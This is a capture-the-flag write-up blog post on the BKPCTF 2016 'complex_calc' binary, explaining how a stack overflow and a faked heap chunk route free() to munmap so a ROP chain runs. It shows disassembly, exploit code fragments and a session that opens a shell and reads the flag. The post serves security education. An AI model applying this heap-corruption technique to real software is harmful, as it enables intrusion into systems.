<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="BKPCTF 2016 - Complex Calc" prefix="og: http://ogp.me/ns#" property=og:title><meta content="BKPCTF 2016 - Complex Calc - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-03-08-bkpctf-2016-complex-calc property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="BKPCTF 2016 - Complex Calc - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-03-08-bkpctf-2016-complex-calc name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2016-03-08-bkpctf-2016-complex-calc",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description": BKPCTF 2016 - Complex Calc - by hugsy",
      
    }
    </script><title>
  BKPCTF 2016 - Complex Calc
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>BKPCTF 2016 - Complex Calc</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 8 March 2016 <br> <br> <i>Reading time: 6 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p>The challenge is the sequel to <code>simple_calc</code>. If you haven’t read our <a href=/posts/2016/03/07/bkpctf-2016-simple-calc-writeup.html>write-up</a>, now is the time 😊<h3 id=info>Info</h3><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>~</span><span> $ file d60001db1a24eca410c5d102410c3311d34d832c
</span><span style=color:#bf616a>d60001db1a24eca410c5d102410c3311d34d832c:</span><span> ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux)</span><span style=color:#bf616a>,</span><span> statically linked, for GNU/Linux 2.6.24, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
</span><span style=color:#bf616a>~</span><span> $ checksec.sh</span><span style=color:#bf616a> --file</span><span> d60001db1a24eca410c5d102410c3311d34d832c
</span><span style=color:#bf616a>RELRO</span><span>           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span style=color:#bf616a>Partial</span><span> RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   d60001db1a24eca410c5d102410c3311d34d832c
</span></code></pre><h3 id=vulnerability>Vulnerability</h3><p>At the very first look, <code>simple_calc</code> and <code>complex_calc</code> look totally similar. Both are statically compiled, same protections, the vulnerability is located at the same spot (i.e. stack overflow with a malloc-ed buffer we fully control). Let’s do some bindiffing!<p>One of my new toys for quite a few months now is IDA Python plugin <a rel="noopener nofollow noreferrer" href=https://github.com/joxeankoret/diaphora target=_blank>diaphora</a> by Joxean Koret (aka <a class="fab fa-twitter" href=https://twitter.com/matalaz target=_blank> <code>@matalaz</code> </a> ). By diffing then, the issue is immediately visible:</p><a href=https://i.imgur.com/0tkaNNT.png target=_blank> <img alt=image_alt src=https://i.imgur.com/0tkaNNT.png title=image_alt width=100%> </a><p>The <code>free()</code> function was modified so we cannot benefit from the graceful exit of the function by simply passing a NULL pointer. Now, <code>free()</code> will always proceed with the address given as first parameter (therefore stored in $rdi).<p>So let’s see how <code>free()</code> works. <a rel="noopener nofollow noreferrer" href=https://kitctf.de/writeups/0ctf2015/freenote target=_blank>Some blogs</a> already explain very well how <a rel="noopener nofollow noreferrer" href=https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/ target=_blank>Glibc heap is structured</a> and how <a rel="noopener nofollow noreferrer" href=http://phrack.org/issues/57/9.html target=_blank>heap</a> <a rel="noopener nofollow noreferrer" href=http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup target=_blank>corruptions</a> work. So I will assume you know as well.<p>To stand on common ground, here is what a heap chunk looks like:</p><a href=https://i.imgur.com/EVnKlBg.png target=_blank> <img alt=image_alt src=https://i.imgur.com/EVnKlBg.png title=image_alt width=100%> </a><p>When <code>free()</code> is called, some checks are made to know how the chunk must be deallocated:<ol><li>If its size is below <code>MMAP_THRESHOLD</code> (default 128KB), then the chunk is deallocated and inserted into the free chunk doubly linked list. The pointers of the list are updated using the <code>unlink</code> macro.<li>If the size is higher than <code>MMAP_THRESHOLD</code>, then the chunk was not allocated via the <code>brk</code>/<code>sbrk</code> syscall, but mapped in memory via the syscall <code>mmap</code>. If this heap chunk is <code>mmap</code>-ed, then its size will be a multiple of 2 (i.e. size & 2 = 2).</ol><p>This actually shows quite well in the flow graph:</p><a href=https://i.imgur.com/omGULMz.png target=_blank> <img alt=image_alt src=https://i.imgur.com/omGULMz.png title=image_alt width=100%> </a><p>Since we control what is written in the heap (same method than <code>simple_calc</code>), we can control whether we want to deallocate using <code>unlink</code> or <code>munmap</code> (simply by or-ing the QWORD interpreter as the chunk size with 2). If we go for using the regular deallocator, we need to fake our heap chunk in such a way that it will pass all the checks performed later on. Any failure on the address will <code>abort()</code> the program, making it enable to reach the <code>ret</code> instruction, and therefore triggering our ROP chain.<p>On the other hand, the <code>munmap()</code> function is actually fairly straight-forward:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:0000000000435670</span><span> munmap          proc near               ; </span><span style=color:#bf616a>CODE</span><span> XREF: __assert_fail_base+110
</span><span style=color:#bf616a>.text:0000000000435670                                         </span><span>; </span><span style=color:#bf616a>_nl_load_domain+4C9</span><span> ...
</span><span style=color:#bf616a>.text:0000000000435670</span><span>                 mov     eax, 0Bh        ; </span><span style=color:#bf616a>Alternative</span><span> name is '</span><span style=color:#a3be8c>__munmap</span><span>'
</span><span style=color:#bf616a>.text:0000000000435675</span><span>                 syscall
</span><span style=color:#bf616a>.text:0000000000435677</span><span>                 cmp     rax,</span><span style=color:#bf616a> -0FFFh
</span><span style=color:#bf616a>.text:000000000043567D</span><span>                 jnb     __syscall_error
</span><span style=color:#bf616a>.text:0000000000435683</span><span>                 retn
</span><span style=color:#bf616a>.text:0000000000435683</span><span> munmap          endp
</span></code></pre><p>If the syscall fails, it will nicely set $rax to a negative value and return back to <code>free()</code>, which will return (in error as well but we don’t care) to our main loop, which can then return nicely too and trigger our code. Perfect! Let’s go with this!<h3 id=exploitation>Exploitation</h3><p>So we are going to use the arithmetic operators and result locations in the <code>.bss</code> since they are at predictable, bearing in mind that each one of them is only a DWORD (whereas we are here on x86-64 architecture). We will want to set the following mapping:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.bss:00000000006C4A88</span><span> add_result      dd ?                    ; &LT-</span><span style=color:#bf616a>-</span><span> previous chunk size
</span><span style=color:#bf616a>.bss:00000000006C4A8C</span><span>                 align 10h
</span><span style=color:#bf616a>.bss:00000000006C4A90</span><span> div_operator_1  dd ?                    ; &LT-</span><span style=color:#bf616a>-</span><span> chunk size (need to | </span><span style=color:#bf616a>2</span><span> for flag IS_`</span><span style=color:#bf616a>mmap</span><span>`-ed)
</span><span style=color:#bf616a>.bss:00000000006C4A94</span><span> div_operator_2  dd ?                    ; &LT-</span><span style=color:#bf616a>-
</span><span style=color:#bf616a>.bss:00000000006C4A98</span><span> div_result      dd ?                    ; &LT-</span><span style=color:#bf616a>-</span><span> free will point @this chunk
</span><span style=color:#bf616a>.bss:00000000006C4A9C</span><span>                 align 10h
</span></code></pre><p>We will point the $rdi used by the <code>free()</code> call pointing to <code>div_result</code>. But now which value should we use then for operator_1 and operator_2 ?<p>Let’s go back to <code>free()</code> flow graph:</p><a href=https://i.imgur.com/7ZEy4nD.png target=_blank> <img alt=image_alt src=https://i.imgur.com/7ZEy4nD.png title=image_alt width=100%> </a><p>As we see, several conditions must be filled:<ol><li><code>chunk_size = div_operator_2 | div_operator_1</code> (and <strong>must</strong> be divisible by 2).<li><code>prev_size  = dword_padding  | add_result</code><li><code>0x0fff & ((@prev_size-prev_size) | (prev_size+size&0xfff...ff8)) == 0</code></ol><p>If we passed those checks, $rcx will have the address to <code>munmap()</code>, and $rsi the range to deallocate. <code>add_result</code> is at 0x6C4A88 so we must ensure the three last nibbles end with 0xa88 to nullify the substration. We decide to store in <code>add_result</code> the value 0x0x11111a88 as the addition of 0x11110a88 and 0x1000<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    </span><span style=color:#65737e># set add_result
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>=> </span><span>")
</span><span>    op1 = </span><span style=color:#d08770>0x11110a88
</span><span>    op2 = </span><span style=color:#d08770>0x00001000
</span><span>    </span><span style=color:#bf616a>do_add</span><span>(s, op1, op2)
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>prev_size=</span><span style=color:#d08770>%#x</span><span style=color:#a3be8c>+</span><span style=color:#d08770>%#x</span><span style=color:#a3be8c>=</span><span style=color:#d08770>%#x</span><span>" % (op2, op1, op1+op2))
</span></code></pre><p>Now that we have <code>prev_size</code>, we can make up a value for <code>size</code> too. But here is the trick, the value of <code>size</code> will end in $rdi when <code>munmap</code> syscall will happen. If we point to a valid address, it will be unmapped and our exploit will fail. So to be safe, we will use a huge valid and let the kernel throw us away :) Here we used 0x7fffdeaa0000.<p><code>size = 0x7fffdeaa0000 - 0x11111a88 = 0x9ffffeee578</code><p>Splitting the result into 2 DWORD and we have div_operator_1=0xfffeee578 and div_operator_2=0x9f.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    </span><span style=color:#65737e># set div_1 and div_2
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>=> </span><span>")
</span><span>    op2, op1  = </span><span style=color:#d08770>0x9f</span><span>, </span><span style=color:#d08770>0xfffeee578 </span><span>| </span><span style=color:#d08770>2
</span><span>    </span><span style=color:#bf616a>do_div</span><span>(s, op1, op2)
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>size=0x</span><span style=color:#d08770>%.8x%.8x</span><span>" % (op2, op1))
</span></code></pre><p>The rest of the exploit is exactly similar to the one used for <code>simple_calc</code>!<p>Fire up!<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> ./complex_calc.py                                                                                                                                       </span><span style=color:#b48ead>[</span><span>23:43</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>[+]</span><span> Connected to simplecalc.bostonkey.party:5500
</span><span style=color:#bf616a>[+]</span><span> Running 47 calculations
</span><span style=color:#bf616a>[+]</span><span> Building fake chunk 0x6c4a98
</span><span style=color:#bf616a>[+]</span><span> prev_size=0x1000+0x11110a88=0x11111a88
</span><span style=color:#bf616a>[+]</span><span> size=0x0000009ffffeee57a
</span><span style=color:#bf616a>[+]</span><span> Got it, interacting (Ctrl-C to break)
</span><span style=color:#bf616a>[+]</span><span> Get a PTY with '</span><span style=color:#a3be8c> python -c "import pty;pty.spawn(</span><span>'/bin/bash'</span><span style=color:#a3be8c>)"  </span><span>'
</span><span style=color:#bf616a>cat</span><span> key
</span><span style=color:#bf616a>BKPCTF{th3</span><span> l4st 1 2 3z}
</span></code></pre><p>And we get <code>BKPCTF{th3 l4st 1 2 3z}</code><p>The full exploit is <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/7bcb5db17b75a86ae3bd target=_blank>here</a>.<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/gef/>#gef</a> <a href=https://blahcat.github.io/tags/ida/>#ida</a> <a href=https://blahcat.github.io/tags/bkpctf-2016/>#bkpctf-2016</a> <a href=https://blahcat.github.io/tags/x86/>#x86</a> <a href=https://blahcat.github.io/tags/heap-overflow/>#heap-overflow</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=BKPCTF 2016 - Complex Calc" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-03-14-0ctf-2016-warmup-write-up/> <section class=post-nav-teaser><b class=post-nav-title>0ctf 2016 - Warmup write-up</b><p class=post-nav-excerpt>I participated to 0ctf but only had time to play for the reversing challeng…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-03-07-bkpctf-2016-simple-calc-writeup/> <section class=post-nav-teaser><b class=post-nav-title>BKPCTF 2016 - Simple Calc</b><p class=post-nav-excerpt>Info ~/cur/simple_calc $ file b28b103ea5f1171553554f0127696a18c6d2dcf7 b28b…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>